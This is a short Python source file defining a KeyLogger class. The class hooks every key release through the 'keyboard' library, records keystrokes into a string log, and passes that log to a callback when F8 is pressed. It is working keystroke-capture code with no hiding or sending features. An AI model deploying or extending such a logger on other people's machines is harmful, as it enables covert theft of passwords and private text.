import keyboard

class KeyLogger():
    def __init__(self):
        self.log = ''
        self.myKeyLogger = keyboard

    def callback(self,evt):
        name = evt.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def start(self):
        self.myKeyLogger.on_release(self.callback)

    def onFinalized(self ,func):
        keyboard.wait('f8') #press f8 to stop logger
        func(self.log)
